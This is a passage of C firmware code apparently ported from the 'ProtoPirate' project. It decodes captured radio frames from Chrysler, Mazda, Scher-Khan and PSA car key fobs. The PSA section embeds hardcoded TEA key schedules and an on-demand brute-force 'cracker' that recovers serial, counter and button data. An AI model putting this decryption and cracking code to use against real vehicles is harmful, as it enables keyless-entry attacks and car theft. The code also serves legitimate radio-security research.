                instance->decoder.parser_step = Chrysler_V0DecoderStepSeek;
            }
            break;
        }

        if((duration > CHRYSLER_V0_TE_GAP) && (instance->packet_bit_count > 0x0F)) {
            instance->decoder.decode_data = 0;
            instance->data_2 = 0;
            instance->decoder.decode_count_bit = 0;
            instance->decoder.parser_step = Chrysler_V0DecoderStepData;
            break;
        }

        instance->decoder.parser_step = Chrysler_V0DecoderStepReset;
        instance->packet_bit_count = 0;
        break;

    case Chrysler_V0DecoderStepData: {
        if(level) {
            instance->te_last = duration;
            break;
        }

        const uint8_t count = instance->decoder.decode_count_bit;
        if(duration > CHRYSLER_V0_TE_GAP) {
            if(count > 0x4FU) {
                instance->generic.data = instance->decoder.decode_data;
                chrysler_v0_decoder_commit(instance);
            }

            instance->decoder.parser_step = Chrysler_V0DecoderStepReset;
            instance->packet_bit_count = 0;
            break;
        }

        uint8_t bit_value = 0;
        if(instance->te_last < CHRYSLER_V0_TE_SHORT) {
            if(!chrysler_v0_is_short(instance->te_last) || !chrysler_v0_is_long_mark(duration)) {
                if(count > 0x4FU) {
                    instance->generic.data = instance->decoder.decode_data;
                    chrysler_v0_decoder_commit(instance);
                }
                instance->decoder.parser_step = Chrysler_V0DecoderStepReset;
                instance->packet_bit_count = 0;
                break;
            }

            bit_value = 1U;
        } else {
            if(instance->te_last > 0x2EEU || !chrysler_v0_is_long_mark(duration)) {
                if(count > 0x4FU) {
                    instance->generic.data = instance->decoder.decode_data;
                    chrysler_v0_decoder_commit(instance);
                }
                instance->decoder.parser_step = Chrysler_V0DecoderStepReset;
                instance->packet_bit_count = 0;
                break;
            }

            bit_value = chrysler_v0_is_short(instance->te_last) ? 1U : 0U;
        }

        const uint8_t bit = bit_value ^ 1U;
        const uint8_t new_count = (uint8_t)(count + 1U);
        if(count <= 0x3FU) {
            instance->decoder.decode_data = (instance->decoder.decode_data << 1U) | bit;
            instance->decoder.decode_count_bit = new_count;
            break;
        }

        instance->data_2 = (uint16_t)((instance->data_2 << 1U) | bit);
        instance->decoder.decode_count_bit = new_count;
        if(new_count != CHRYSLER_V0_DECODE_BIT_COUNT) {
            break;
        }

        instance->generic.data = instance->decoder.decode_data;
        chrysler_v0_decoder_commit(instance);
        instance->decoder.decode_data = 0;
        instance->data_2 = 0;
        instance->decoder.decode_count_bit = 0;
        instance->decoder.parser_step = Chrysler_V0DecoderStepReset;
        instance->packet_bit_count = 0;
        break;
    }

    default:
        instance->decoder.parser_step = Chrysler_V0DecoderStepReset;
        break;
    }
}

// =============================================================================
// Mazda V0 -- ProtoPirate (GPLv3)
// =============================================================================

// (1) block const
static const SubGhzBlockConst mazda_v0_const = {
    .te_short = 250,
    .te_long = 500,
    .te_delta = 100,
    .min_count_bit_for_found = 64,
};

// (2) constants used by feed (UPLOAD_CAPACITY / GAP / TAIL are encoder-only, dropped)
#define MAZDA_V0_SYNC_BYTE     0xD7
#define MAZDA_V0_PREAMBLE_ONES 16

// (3) instance type
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    ManchesterState manchester_state;
    uint16_t preamble_count;
    uint8_t preamble_pattern;

    uint32_t serial;
    uint8_t button;
    uint32_t count;
} PpDec_mazda_v0;

// (4) decoder step enum
typedef enum {
    MazdaV0DecoderStepReset = 0,
    MazdaV0DecoderStepPreamble = 5,
    MazdaV0DecoderStepData = 6,
} MazdaV0DecoderStep;

// (5) static helpers reachable from the feed path
static uint8_t mazda_v0_calculate_checksum(uint32_t serial, uint8_t button, uint32_t counter) {
    counter &= 0xFFFFFU;
    return (uint8_t)(((serial >> 24) & 0xFF) + ((serial >> 16) & 0xFF) + ((serial >> 8) & 0xFF) +
                     (serial & 0xFF) + ((counter >> 8) & 0xFF) + (counter & 0xFF) +
                     ((((counter >> 16) & 0x0F) | ((button & 0x0F) << 4)) & 0xFF));
}

static bool mazda_v0_get_event(uint32_t duration, bool level, ManchesterEvent* event) {
    const uint32_t tol = (uint32_t)mazda_v0_const.te_delta + 20U;

    if((uint32_t)DURATION_DIFF(duration, mazda_v0_const.te_short) < tol) {
        *event = level ? ManchesterEventShortLow : ManchesterEventShortHigh;
        return true;
    }

    if((uint32_t)DURATION_DIFF(duration, mazda_v0_const.te_long) < tol) {
        *event = level ? ManchesterEventLongLow : ManchesterEventLongHigh;
        return true;
    }

    return false;
}

static void mazda_v0_decode_key(SubGhzBlockGeneric* generic) {
    uint8_t data[8];
    pp_u64_to_bytes_be(generic->data, data);

    // NOTE: source used subghz_protocol_blocks_parity8(data[7]); the shim
    // exposes subghz_protocol_blocks_get_parity(v,bits) instead -- equivalent
    // for a single byte as get_parity(x, 8).
    const bool parity = subghz_protocol_blocks_get_parity(data[7], 8) != 0;
    const uint8_t limit = parity ? 6 : 5;
    const uint8_t mask = data[limit];

    for(uint8_t i = 0; i < limit; i++) {
        data[i] ^= mask;
    }

    if(!parity) {
        data[6] ^= mask;
    }

    const uint8_t counter_lo = (data[5] & 0x55) | (data[6] & 0xAA);
    const uint8_t counter_mid = (data[6] & 0x55) | (data[5] & 0xAA);

    generic->serial = ((uint32_t)data[0] << 24) | ((uint32_t)data[1] << 16) |
                      ((uint32_t)data[2] << 8) | (uint32_t)data[3];
    generic->btn = (data[4] >> 4) & 0x0F;
    generic->cnt = (((uint32_t)data[4] & 0x0F) << 16) | ((uint32_t)counter_mid << 8) |
                   (uint32_t)counter_lo;
    generic->data_count_bit = mazda_v0_const.min_count_bit_for_found;
}

// (6) alloc
static void* mazda_v0_alloc() {
    PpDec_mazda_v0* i = (PpDec_mazda_v0*)calloc(1, sizeof(PpDec_mazda_v0));
    if(!i) return NULL;
    i->generic.protocol_name = "Mazda V0";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void mazda_v0_reset(void* context) {
    PpDec_mazda_v0* instance = (PpDec_mazda_v0*)context;

    instance->decoder.parser_step = MazdaV0DecoderStepReset;
    instance->decoder.te_last = 0;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->manchester_state = ManchesterStateStart1;
    instance->preamble_count = 0;
    instance->preamble_pattern = 0;
}

// (8) feed
static void mazda_v0_feed(void* context, bool level, uint32_t duration) {
    PpDec_mazda_v0* instance = (PpDec_mazda_v0*)context;
    ManchesterEvent event = ManchesterEventReset;
    bool data = false;

    switch(instance->decoder.parser_step) {
    case MazdaV0DecoderStepReset:
        if(level && ((uint32_t)DURATION_DIFF(duration, mazda_v0_const.te_short) <
                     (uint32_t)mazda_v0_const.te_delta + 20U)) {
            instance->decoder.decode_data = 0;
            instance->decoder.decode_count_bit = 0;
            instance->decoder.parser_step = MazdaV0DecoderStepPreamble;
            instance->manchester_state = ManchesterStateMid1;
            instance->preamble_count = 0;
            instance->preamble_pattern = 0;
        }
        break;

    case MazdaV0DecoderStepPreamble:
        if(!mazda_v0_get_event(duration, level, &event)) {
            instance->decoder.parser_step = MazdaV0DecoderStepReset;
            break;
        }

        if(manchester_advance(
               instance->manchester_state, event, &instance->manchester_state, &data)) {
            instance->preamble_pattern = (instance->preamble_pattern << 1) | (data ? 1 : 0);

            if(data) {
                instance->preamble_count++;
            } else if(instance->preamble_count <= MAZDA_V0_PREAMBLE_ONES - 1U) {
                instance->preamble_count = 0;
                instance->preamble_pattern = 0;
                break;
            }

            if((instance->preamble_pattern == MAZDA_V0_SYNC_BYTE) &&
               (instance->preamble_count > MAZDA_V0_PREAMBLE_ONES - 1U)) {
                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                instance->decoder.parser_step = MazdaV0DecoderStepData;
            }
        }
        break;

    case MazdaV0DecoderStepData:
        if(!mazda_v0_get_event(duration, level, &event)) {
            instance->decoder.parser_step = MazdaV0DecoderStepReset;
            break;
        }

        if(manchester_advance(
               instance->manchester_state, event, &instance->manchester_state, &data)) {
            subghz_protocol_blocks_add_bit(&instance->decoder, data);

            if(instance->decoder.decode_count_bit == mazda_v0_const.min_count_bit_for_found) {
                instance->generic.data = ~instance->decoder.decode_data;
                mazda_v0_decode_key(&instance->generic);

                if(mazda_v0_calculate_checksum(
                       instance->generic.serial, instance->generic.btn, instance->generic.cnt) ==
                   (uint8_t)instance->generic.data) {
                    instance->serial = instance->generic.serial;
                    instance->button = instance->generic.btn;
                    instance->count = instance->generic.cnt;

                    if(instance->base.callback) {
                        instance->base.callback(&instance->base, instance->base.context);
                    }
                }

                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                instance->preamble_count = 0;
                instance->preamble_pattern = 0;
                instance->manchester_state = ManchesterStateStart1;
                instance->decoder.te_last = 0;
                instance->decoder.parser_step = MazdaV0DecoderStepReset;
            }
        }
        break;
    }
}

// =============================================================================
// Scher-Khan -- ProtoPirate (GPLv3)
// =============================================================================

// (1) block const
static const SubGhzBlockConst scher_khan_const = {
    .te_short = 750,
    .te_long = 1100,
    .te_delta = 160,
    .min_count_bit_for_found = 35,
};

// (4) decoder step enum
typedef enum {
    ScherKhanDecoderStepReset = 0,
    ScherKhanDecoderStepCheckPreambula,
    ScherKhanDecoderStepSaveDuration,
    ScherKhanDecoderStepCheckDuration,
} ScherKhanDecoderStep;

// (3) instance type
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint16_t header_count;
    const char* protocol_name;
} PpDec_scher_khan;

// (6) alloc
static void* scher_khan_alloc() {
    PpDec_scher_khan* i = (PpDec_scher_khan*)calloc(1, sizeof(PpDec_scher_khan));
    if(!i) return NULL;
    i->generic.protocol_name = "Scher-Khan";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void scher_khan_reset(void* context) {
    PpDec_scher_khan* instance = (PpDec_scher_khan*)context;
    instance->decoder.parser_step = ScherKhanDecoderStepReset;
}

// (8) feed
static void scher_khan_feed(void* context, bool level, uint32_t duration) {
    PpDec_scher_khan* instance = (PpDec_scher_khan*)context;

    switch(instance->decoder.parser_step) {
    case ScherKhanDecoderStepReset:
        if((level) && (DURATION_DIFF(duration, scher_khan_const.te_short * 2) <
                       scher_khan_const.te_delta)) {
            instance->decoder.parser_step = ScherKhanDecoderStepCheckPreambula;
            instance->decoder.te_last = duration;
            instance->header_count = 0;
        }
        break;
    case ScherKhanDecoderStepCheckPreambula:
        if(level) {
            if((DURATION_DIFF(duration, scher_khan_const.te_short * 2) <
                scher_khan_const.te_delta) ||
               (DURATION_DIFF(duration, scher_khan_const.te_short) < scher_khan_const.te_delta)) {
                instance->decoder.te_last = duration;
            } else {
                instance->decoder.parser_step = ScherKhanDecoderStepReset;
            }
        } else if(
            (DURATION_DIFF(duration, scher_khan_const.te_short * 2) < scher_khan_const.te_delta) ||
            (DURATION_DIFF(duration, scher_khan_const.te_short) < scher_khan_const.te_delta)) {
            if(DURATION_DIFF(instance->decoder.te_last, scher_khan_const.te_short * 2) <
               scher_khan_const.te_delta) {
                // Found header
                instance->header_count++;
                break;
            } else if(
                DURATION_DIFF(instance->decoder.te_last, scher_khan_const.te_short) <
                scher_khan_const.te_delta) {
                // Found start bit
                if(instance->header_count >= 2) {
                    instance->decoder.parser_step = ScherKhanDecoderStepSaveDuration;
                    instance->decoder.decode_data = 0;
                    instance->decoder.decode_count_bit = 1;
                } else {
                    instance->decoder.parser_step = ScherKhanDecoderStepReset;
                }
            } else {
                instance->decoder.parser_step = ScherKhanDecoderStepReset;
            }
        } else {
            instance->decoder.parser_step = ScherKhanDecoderStepReset;
        }
        break;
    case ScherKhanDecoderStepSaveDuration:
        if(level) {
            if(duration >= (scher_khan_const.te_delta * 2UL + scher_khan_const.te_long)) {
                //Found stop bit
                instance->decoder.parser_step = ScherKhanDecoderStepReset;
                if(instance->decoder.decode_count_bit >= scher_khan_const.min_count_bit_for_found) {
                    instance->generic.data = instance->decoder.decode_data;
                    instance->generic.data_count_bit = instance->decoder.decode_count_bit;
                    if(instance->base.callback)
                        instance->base.callback(&instance->base, instance->base.context);
                }
                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                break;
            } else {
                instance->decoder.te_last = duration;
                instance->decoder.parser_step = ScherKhanDecoderStepCheckDuration;
            }

        } else {
            instance->decoder.parser_step = ScherKhanDecoderStepReset;
        }
        break;
    case ScherKhanDecoderStepCheckDuration:
        if(!level) {
            if((DURATION_DIFF(instance->decoder.te_last, scher_khan_const.te_short) <
                scher_khan_const.te_delta) &&
               (DURATION_DIFF(duration, scher_khan_const.te_short) < scher_khan_const.te_delta)) {
                subghz_protocol_blocks_add_bit(&instance->decoder, 0);
                instance->decoder.parser_step = ScherKhanDecoderStepSaveDuration;
            } else if(
                (DURATION_DIFF(instance->decoder.te_last, scher_khan_const.te_long) <
                 scher_khan_const.te_delta) &&
                (DURATION_DIFF(duration, scher_khan_const.te_long) < scher_khan_const.te_delta)) {
                subghz_protocol_blocks_add_bit(&instance->decoder, 1);
                instance->decoder.parser_step = ScherKhanDecoderStepSaveDuration;
            } else {
                instance->decoder.parser_step = ScherKhanDecoderStepReset;
            }
        } else {
            instance->decoder.parser_step = ScherKhanDecoderStepReset;
        }
        break;
    }
}

// =============================================================================
// REGISTRY + UNRESOLVED REPORT -- ProtoPirate (GPLv3)
// =============================================================================
/*
 * (a) REGISTRY LINES (ported decoders):
 *
 *   { "Chrysler V0", chrysler_v0_alloc, chrysler_v0_feed, chrysler_v0_reset, nullptr },
 *   { "Mazda V0",    mazda_v0_alloc,    mazda_v0_feed,    mazda_v0_reset,    nullptr },
 *   { "Scher-Khan",  scher_khan_alloc,  scher_khan_feed,  scher_khan_reset,  nullptr },
 *
 * PORTED: 3   SKIPPED: 3
 *
 * ---------------------------------------------------------------------------
 * (b) UNRESOLVED REPORT
 * ---------------------------------------------------------------------------
 *
 * NOTE (Mazda V0, ported): source called subghz_protocol_blocks_parity8(x),
 *   which is NOT in the shim. It was substituted with the shim-provided
 *   subghz_protocol_blocks_get_parity(x, 8) (functionally identical for a
 *   single byte). If the shim's get_parity semantics differ, revisit
 *   mazda_v0_decode_key().
 *
 * SKIPPED -- StarLine (star_line.c):
 *   The feed() decode path itself is clean (only subghz_protocol_blocks_add_bit
 *   + the block const), BUT the required reset() body and the decoder struct
 *   pull in external symbols/types absent from the shim:
 *     - SubGhzKeystore                (type of struct field `keystore`)
 *     - FuriString                    (type of struct field `manufacture_from_file`)
 *     - subghz_environment_get_keystore   (used by original alloc)
 *     - instance->keystore->mfname        (written in reset())
 *     - instance->keystore->kl_type       (written in reset())
 *   (The dropped decrypt path -- check_remote_controller -- additionally needs
 *    subghz_protocol_keeloq_common_decrypt, subghz_protocol_keeloq_common_normal_learning,
 *    subghz_protocol_blocks_reverse_key, subghz_keystore_get_data, SubGhzKeyArray_t,
 *    the M_EACH macro and the KEELOQ_LEARNING_* enum -- all from keeloq_common.h /
 *    subghz_keystore.h.)
 *   Not emittable without a keystore-aware shim; hand-port possible if reset()
 *   drops the keystore lines and the struct drops the keystore/FuriString fields.
 *
 * SKIPPED -- VAG (vag.c):
 *   feed() -> vag_parse_data() depends on external AUT64 crypto and keystore:
 *     - struct aut64_key              (type, from aut64.h)
 *     - aut64_decrypt                 (from aut64.c, another file)
 *     - aut64_unpack                  (from aut64.c, another file)
 *     - subghz_keystore_raw_get_data  (subghz_keystore.h)
 *     - AUT64_PACKED_KEY_SIZE, AUT64_OK, AUT64_ERR_INVALID_PACKED,
 *       AUT64_ERR_NULL_POINTER        (aut64.h macros)
 *     - MIN                           (furi macro, not in shim)
 *     - APP_ASSETS_PATH               (app macro, used by alloc for key file)
 *   (vag_tea_decrypt / TEA path is self-contained, but the type-1/3/4 AUT64
 *    paths and key loading are not, so the whole decoder is skipped.)
 *
 * SKIPPED -- AUT64 (aut64.c):
 *   aut64.c contains ONLY the AUT64 block-cipher primitive
 *   (aut64_encrypt / aut64_decrypt / aut64_unpack / aut64_validate_key and the
 *   static box helpers). It has NO decoder -- no feed/reset/alloc, no
 *   SubGhzProtocolDecoder struct -- so there is no DECODE path to port. It is
 *   itself the external crypto that VAG depends on, and relies on aut64.h
 *   (struct aut64_key, AUT64_* size/round/error macros).
 */



// ===== fragment: pp_frag_psa.h (PSA, GPLv3) =====
/* ============================================================================
 * PSA — ProtoPirate (GPLv3)
 * Peugeot / Citroen / DS rolling-code car keys.
 * Self-contained crypto: TEA + built-in brute force (no external keystore).
 * Manchester-coded, 128-bit frame (64-bit Key1 + 16-bit Key2/ValidationField).
 * The decode-time direct-XOR handles Type 0x23; Type 0x36 frames are finalized
 * on-device with the bounded TEA brute force (relocated from get_string).
 * ==========================================================================*/

/* ---- PSA framing constants (from psa.c) --------------------------------- */
#define PSA_TE_SHORT_125        0x7d
#define PSA_TE_LONG_250         0xfa
#define PSA_TE_END_1000         1000
#define PSA_TE_END_500          500
#define PSA_TOLERANCE_99        99
#define PSA_TOLERANCE_100       100
#define PSA_TOLERANCE_49        0x31
#define PSA_TOLERANCE_50        0x32
#define PSA_PATTERN_THRESHOLD_1 0x46
#define PSA_PATTERN_THRESHOLD_2 0x45
#define PSA_MAX_BITS            0x79
#define PSA_KEY1_BITS           0x40
#define PSA_KEY2_BITS           0x50
#define PSA_BUFFER_SIZE         48
#define PSA_TE_LONG_300         0x12c

/* ---- TEA / brute-force constants (from psa_crypto.c / psa_crypto_bf.*) --- */
#define TEA_DELTA  0x9E3779B9U
#define TEA_ROUNDS 32

#define PSA_CRYPTO_BF1_CONST_U4 0x0E0F5C41U
#define PSA_CRYPTO_BF1_CONST_U5 0x0F5C4123U

#define PSA_CRYPTO_BF1_START 0x23000000U
#define PSA_CRYPTO_BF1_END   0x24000000U
#define PSA_CRYPTO_BF2_START 0xF3000000U
#define PSA_CRYPTO_BF2_END   0xF4000000U

#define PSA_BF_PROGRESS_INTERVAL 4096U

#define PSA_BF_STATUS_IDLE      0
#define PSA_BF_STATUS_RUNNING   1
#define PSA_BF_STATUS_FOUND     2
#define PSA_BF_STATUS_NOT_FOUND 3
#define PSA_BF_STATUS_CANCELLED 4

/* ---- Key schedules (from psa_crypto.c) ---------------------------------- */
static const uint32_t psa_crypto_bf1_key_schedule[4] = {
    0x4A434915U,
    0xD6743C2BU,
    0x1F29D308U,
    0xE6B79A64U,
};

static const uint32_t psa_crypto_bf2_key_schedule[4] = {
    0x4039C240U,
    0xEDA92CABU,
    0x4306C02AU,
    0x02192A04U,
};

/* ---- Crypto primitives reached by the decode/BF path (psa_crypto.c) ----- */
static void psa_crypto_setup_byte_buffer(
    uint8_t* buffer,
    uint32_t key1_low,
    uint32_t key1_high,
    uint32_t key2_low) {
    for(int i = 0; i < 8; i++) {
        int shift = i * 8;
        uint8_t byte_val;
        if(shift < 32) {
            byte_val = (uint8_t)((key1_low >> shift) & 0xFF);
        } else {
            byte_val = (uint8_t)((key1_high >> (shift - 32)) & 0xFF);
        }
        buffer[7 - i] = byte_val;
    }
    buffer[9] = (uint8_t)(key2_low & 0xFF);
    buffer[8] = (uint8_t)((key2_low >> 8) & 0xFF);
}

static void psa_crypto_prepare_tea_data(const uint8_t* buffer, uint32_t* w0, uint32_t* w1) {
    *w0 = ((uint32_t)buffer[3] << 16) | ((uint32_t)buffer[2] << 24) | ((uint32_t)buffer[4] << 8) |
          (uint32_t)buffer[5];
    *w1 = ((uint32_t)buffer[7] << 16) | ((uint32_t)buffer[6] << 24) | ((uint32_t)buffer[8] << 8) |
          (uint32_t)buffer[9];
}

static uint8_t psa_crypto_tea_crc(uint32_t v0, uint32_t v1) {
    uint32_t crc = ((v0 >> 24) & 0xFF) + ((v0 >> 16) & 0xFF) + ((v0 >> 8) & 0xFF) + (v0 & 0xFF);
    crc += ((v1 >> 24) & 0xFF) + ((v1 >> 16) & 0xFF) + ((v1 >> 8) & 0xFF);
    return (uint8_t)(crc & 0xFF);
}

static uint16_t psa_crypto_crc16_bf2(uint8_t* buffer, int length) {
    uint16_t crc = 0;
    for(int i = 0; i < length; i++) {
        crc = crc ^ ((uint16_t)buffer[i] << 8);
        for(int j = 0; j < 8; j++) {
            if(crc & 0x8000) {
                crc = (crc << 1) ^ 0x8005;
            } else {
                crc = crc << 1;
            }
            crc = crc & 0xFFFF;
        }
    }
    return crc & 0xFFFF;
}

static void psa_crypto_unpack_tea_result_to_buffer(uint8_t* buffer, uint32_t v0, uint32_t v1) {
    buffer[2] = (uint8_t)((v0 >> 24) & 0xFF);
    buffer[3] = (uint8_t)((v0 >> 16) & 0xFF);
    buffer[4] = (uint8_t)((v0 >> 8) & 0xFF);
    buffer[5] = (uint8_t)(v0 & 0xFF);
    buffer[6] = (uint8_t)((v1 >> 24) & 0xFF);
    buffer[7] = (uint8_t)((v1 >> 16) & 0xFF);
    buffer[8] = (uint8_t)((v1 >> 8) & 0xFF);
    buffer[9] = (uint8_t)(v1 & 0xFF);
}

/* ---- Brute-force state (from psa_bf_types.h; FF/thread bits dropped) ----- */
typedef struct PsaBfState PsaBfState;
struct PsaBfState {
    volatile uint8_t cancel;
    volatile uint32_t progress_current;
    volatile uint32_t progress_total;
    volatile uint8_t status;
    void (*on_done)(void* context);
    void* on_done_ctx;

    uint32_t key1_low;
    uint32_t key1_high;
    uint16_t key2_low;

    uint8_t decrypted_button;
    uint32_t decrypted_serial;
    uint32_t decrypted_counter;
    uint16_t decrypted_crc;
    uint32_t decrypted_seed;
    uint8_t decrypted_type;
};

/* ---- Brute-force core (from psa_crypto_bf.c) ----------------------------- */
typedef struct {
    uint32_t s0[TEA_ROUNDS];
    uint32_t s1[TEA_ROUNDS];
} PsaTeaSchedule;

static void psa_bf_tea_build_schedule(const uint32_t* key, PsaTeaSchedule* out) {
    for(int i = 0; i < TEA_ROUNDS; i++) {
        uint32_t sum0 = (uint32_t)((uint64_t)i * TEA_DELTA);
        uint32_t sum1 = (uint32_t)((uint64_t)(i + 1) * TEA_DELTA);
        out->s0[i] = key[sum0 & 3] + sum0;
        out->s1[i] = key[(sum1 >> 11) & 3] + sum1;
    }
}

static inline void
    psa_bf_tea_encrypt_with_schedule(uint32_t* v0, uint32_t* v1, const PsaTeaSchedule* sched) {
    uint32_t a = *v0, b = *v1;
#pragma GCC unroll 32
    for(int i = 0; i < TEA_ROUNDS; i++) {
        a += (sched->s0[i] ^ (((b >> 5) ^ (b << 4)) + b));
        b += (sched->s1[i] ^ (((a >> 5) ^ (a << 4)) + a));
    }
    *v0 = a;
    *v1 = b;
}

static inline void psa_bf_tea_decrypt(uint32_t* v0, uint32_t* v1, const uint32_t* key) {
    uint32_t a = *v0, b = *v1;
    const uint32_t k[4] = {key[0], key[1], key[2], key[3]};
    uint32_t sum = TEA_DELTA * TEA_ROUNDS;
#pragma GCC unroll 32
    for(int i = 0; i < TEA_ROUNDS; i++) {
        uint32_t temp = k[(sum >> 11) & 3] + sum;
        sum = sum - TEA_DELTA;
        b = b - (temp ^ (((a >> 5) ^ (a << 4)) + a));
        temp = k[sum & 3] + sum;
        a = a - (temp ^ (((b >> 5) ^ (b << 4)) + b));
    }
    *v0 = a;
    *v1 = b;
}

static void psa_bf_fill_state_from_buffer(PsaBfState* state, uint8_t* buffer) {
    state->decrypted_button = (buffer[5] >> 4) & 0xF;
    state->decrypted_serial = ((uint32_t)buffer[3] << 8) | ((uint32_t)buffer[2] << 16) |
                              (uint32_t)buffer[4];
    state->decrypted_counter = ((uint32_t)buffer[7] << 8) | ((uint32_t)buffer[6] << 16) |
                               (uint32_t)buffer[8] | (((uint32_t)buffer[5] & 0xF) << 24);
    state->decrypted_crc = (uint16_t)buffer[9];
    state->decrypted_seed = state->decrypted_serial;
    state->decrypted_type = 0x36;
}

/* Bounded synchronous brute force. Worst case:
 *   (BF1_END-BF1_START) + (BF2_END-BF2_START) = 0x1000000 + 0x1000000
 *   = 33,554,432 iterations, then returns PSA_BF_STATUS_NOT_FOUND.  */
// Garde-fou d'intégration Cardputer : la BF PSA fait jusqu'à ~33 M itérations.
// La lancer inline dans feed() gèlerait l'UI et déclencherait le task-watchdog.
// Par défaut désactivée (décodage structure + direct-XOR restent instantanés) ;
// activée uniquement par le cracker on-demand (UI) qui affiche une progression.
static volatile bool g_psa_allow_bf = false;

static void psa_brute_force_run(PsaBfState* state) {
    if(!g_psa_allow_bf) { state->status = PSA_BF_STATUS_NOT_FOUND; return; }
    uint8_t buffer[48] = {0};
    psa_crypto_setup_byte_buffer(buffer, state->key1_low, state->key1_high, state->key2_low);
    uint32_t w0, w1;
    psa_crypto_prepare_tea_data(buffer, &w0, &w1);

    state->progress_current = 0;
    state->progress_total =
        (PSA_CRYPTO_BF1_END - PSA_CRYPTO_BF1_START) + (PSA_CRYPTO_BF2_END - PSA_CRYPTO_BF2_START);
    state->status = PSA_BF_STATUS_RUNNING;

    PsaTeaSchedule bf1_sched;
    psa_bf_tea_build_schedule(psa_crypto_bf1_key_schedule, &bf1_sched);

    for(uint32_t counter = PSA_CRYPTO_BF1_START; counter < PSA_CRYPTO_BF1_END; counter++) {
        if(state->cancel) {
            state->status = PSA_BF_STATUS_CANCELLED;
            return;
        }
        if((counter & 8191U) == 0) { esp_task_wdt_reset(); if((counter & 0xFFFFU) == 0) vTaskDelay(1); } // WDT + cède le CPU (évite starve IDLE0)
        if((counter & (PSA_BF_PROGRESS_INTERVAL - 1)) == 0) {
            state->progress_current = counter - PSA_CRYPTO_BF1_START;
        }

        uint32_t wk2 = PSA_CRYPTO_BF1_CONST_U4;
        uint32_t wk3 = counter;
        psa_bf_tea_encrypt_with_schedule(&wk2, &wk3, &bf1_sched);
        uint32_t wk0 = (counter << 8) | 0x0E;
        uint32_t wk1 = PSA_CRYPTO_BF1_CONST_U5;
        psa_bf_tea_encrypt_with_schedule(&wk0, &wk1, &bf1_sched);
        uint32_t working_key[4] = {wk0, wk1, wk2, wk3};

        uint32_t dec_v0 = w0;
        uint32_t dec_v1 = w1;
        psa_bf_tea_decrypt(&dec_v0, &dec_v1, working_key);

        if((counter & 0xFFFFFF) == (dec_v0 >> 8)) {
            uint8_t crc = psa_crypto_tea_crc(dec_v0, dec_v1);
            if(crc == (dec_v1 & 0xFF)) {
                psa_crypto_unpack_tea_result_to_buffer(buffer, dec_v0, dec_v1);
                psa_bf_fill_state_from_buffer(state, buffer);
                state->progress_current = counter - PSA_CRYPTO_BF1_START;
                state->status = PSA_BF_STATUS_FOUND;
                return;
            }
        }
    }

    state->progress_current = PSA_CRYPTO_BF1_END - PSA_CRYPTO_BF1_START;

    for(uint32_t counter = PSA_CRYPTO_BF2_START; counter < PSA_CRYPTO_BF2_END; counter++) {
        if(state->cancel) {
            state->status = PSA_BF_STATUS_CANCELLED;
            return;
        }
        if((counter & 8191U) == 0) { esp_task_wdt_reset(); if((counter & 0xFFFFU) == 0) vTaskDelay(1); } // WDT + cède le CPU (évite starve IDLE0)
        if((counter & (PSA_BF_PROGRESS_INTERVAL - 1)) == 0) {
            state->progress_current =
                (PSA_CRYPTO_BF1_END - PSA_CRYPTO_BF1_START) + (counter - PSA_CRYPTO_BF2_START);
        }

        uint32_t working_key[4] = {
            psa_crypto_bf2_key_schedule[0] ^ counter,
            psa_crypto_bf2_key_schedule[1] ^ counter,
            psa_crypto_bf2_key_schedule[2] ^ counter,
            psa_crypto_bf2_key_schedule[3] ^ counter,
        };
        uint32_t dec_v0 = w0;
        uint32_t dec_v1 = w1;
        psa_bf_tea_decrypt(&dec_v0, &dec_v1, working_key);

        if((counter & 0xFFFFFF) == (dec_v0 >> 8)) {
            psa_crypto_unpack_tea_result_to_buffer(buffer, dec_v0, dec_v1);
            uint8_t crc_buffer[6] = {
                (uint8_t)((dec_v0 >> 24) & 0xFF),
                (uint8_t)((dec_v0 >> 8) & 0xFF),
                (uint8_t)((dec_v0 >> 16) & 0xFF),
                (uint8_t)(dec_v0 & 0xFF),
                (uint8_t)((dec_v1 >> 24) & 0xFF),
                (uint8_t)((dec_v1 >> 16) & 0xFF),
            };
            uint16_t crc16 = psa_crypto_crc16_bf2(crc_buffer, 6);
            uint16_t expected_crc = (uint16_t)(dec_v1 & 0xFFFF);
            if(crc16 == expected_crc) {
                psa_bf_fill_state_from_buffer(state, buffer);
                state->progress_current =
                    (PSA_CRYPTO_BF1_END - PSA_CRYPTO_BF1_START) + (counter - PSA_CRYPTO_BF2_START);
                state->status = PSA_BF_STATUS_FOUND;
                return;
            }
        }
    }

    state->status = PSA_BF_STATUS_NOT_FOUND;
}

/* ---- Timing constant (from psa.c) --------------------------------------- */
static const SubGhzBlockConst psa_const = {
    .te_short = 250,
    .te_long = 500,
    .te_delta = 100,
    .min_count_bit_for_found = 128,
};

/* ---- Decoder step enum (from psa.c) ------------------------------------- */
typedef enum {
    PSADecoderState0 = 0,
    PSADecoderState1 = 1,
    PSADecoderState2 = 2,
    PSADecoderState3 = 3,
    PSADecoderState4 = 4,
} PSADecoderState;

/* ---- Decoder instance (extra fields VERBATIM from the source struct) ---- */
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint32_t state;
    uint32_t prev_duration;

    uint32_t decode_data_low;
    uint32_t decode_data_high;
    uint8_t decode_count_bit;

    uint32_t seed;
    uint32_t key1_low;
    uint32_t key1_high;
    uint16_t validation_field;
    uint32_t key2_low;
    uint32_t key2_high;

    uint32_t status_flag;
    uint16_t decrypted;
    uint8_t mode_serialize;

    uint16_t pattern_counter;
    ManchesterState manchester_state;

    uint8_t decrypted_button;
    uint32_t decrypted_serial;
    uint32_t decrypted_counter;
    uint16_t decrypted_crc;
    uint32_t decrypted_seed;
    uint8_t decrypted_type;
} PpDec_psa;

/* ---- Direct-XOR decode helpers (from psa.c) ----------------------------- */
static uint32_t psa_abs_diff(uint32_t a, uint32_t b) {
